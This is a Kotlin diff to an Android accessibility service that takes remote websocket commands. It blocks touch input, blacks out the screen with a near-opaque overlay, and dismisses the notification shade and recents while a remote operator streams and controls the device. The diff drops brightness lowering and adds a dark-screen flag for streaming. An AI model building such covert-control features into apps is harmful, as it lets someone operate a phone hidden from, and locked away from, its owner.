@@ -48,8 +48,6 @@ class ControlService : AccessibilityService() {
     private var overlayView: View? = null
     private var overlayParams: WindowManager.LayoutParams? = null
     private var darkView: View? = null
-    private var savedBrightness = -1
-    private var savedBrightnessMode = -1
     private val screenExecutor = Executors.newSingleThreadExecutor()
 
     // Periodically dismiss the notification shade and recents while overlay is locked.
@@ -160,13 +158,12 @@ class ControlService : AccessibilityService() {
             WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN,
             PixelFormat.TRANSLUCENT
         )
-        val view = View(this).apply { setBackgroundColor(android.graphics.Color.BLACK) }
+        val view = View(this).apply { setBackgroundColor(android.graphics.Color.argb(252, 0, 0, 0)) }
         darkView = view
         ctrlHandler.post {
             try { (getSystemService(WINDOW_SERVICE) as WindowManager).addView(view, params) }
             catch (_: Exception) { darkView = null }
         }
-        applyLowBrightness()
     }
 
     private fun hideDarkOverlay() {
@@ -175,41 +172,6 @@ class ControlService : AccessibilityService() {
         ctrlHandler.post {
             try { (getSystemService(WINDOW_SERVICE) as WindowManager).removeView(v) } catch (_: Exception) {}
         }
-        restoreBrightness()
-    }
-
-    private fun applyLowBrightness() {
-        if (!android.provider.Settings.System.canWrite(this)) {
-            try {
-                startActivity(android.content.Intent(
-                    android.provider.Settings.ACTION_MANAGE_WRITE_SETTINGS,
-                    android.net.Uri.parse("package:$packageName")
-                ).addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK))
-            } catch (_: Exception) {}
-            return
-        }
-        val cr = contentResolver
-        savedBrightnessMode = android.provider.Settings.System.getInt(
-            cr, android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE,
-            android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE_AUTOMATIC)
-        savedBrightness = android.provider.Settings.System.getInt(
-            cr, android.provider.Settings.System.SCREEN_BRIGHTNESS, 128)
-        android.provider.Settings.System.putInt(
-            cr, android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE,
-            android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL)
-        android.provider.Settings.System.putInt(
-            cr, android.provider.Settings.System.SCREEN_BRIGHTNESS, 0)
-    }
-
-    private fun restoreBrightness() {
-        if (!android.provider.Settings.System.canWrite(this)) return
-        if (savedBrightness < 0) return
-        val cr = contentResolver
-        android.provider.Settings.System.putInt(
-            cr, android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE, savedBrightnessMode)
-        android.provider.Settings.System.putInt(
-            cr, android.provider.Settings.System.SCREEN_BRIGHTNESS, savedBrightness)
-        savedBrightness = -1
     }
 
     private fun dispatchGestureWithOverlay(gesture: GestureDescription) {
@@ -250,7 +212,9 @@ class ControlService : AccessibilityService() {
                 if (msg.optBoolean("locked", false)) showTouchBlockOverlay() else hideTouchBlockOverlay()
             }
             "dark-screen" -> ctrlHandler.post {
-                if (msg.optBoolean("enabled", false)) showDarkOverlay() else hideDarkOverlay()
+                val on = msg.optBoolean("enabled", false)
+                StreamingService.darkScreen = on
+                if (on) showDarkOverlay() else hideDarkOverlay()
             }
             "screen-quality" -> {
                 StreamingService.screenQuality = msg.optInt("quality", 60).coerceIn(10, 90)
@@ -384,6 +348,7 @@ class ControlService : AccessibilityService() {
         resetLocks()
         hideTouchBlockOverlay()
         hideDarkOverlay()
+        StreamingService.darkScreen = false
         wsControl?.close(1000, "stopped"); wsControl = null
         screenExecutor.shutdown()
         try { http.dispatcher.executorService.shutdown() } catch (_: Exception) {}
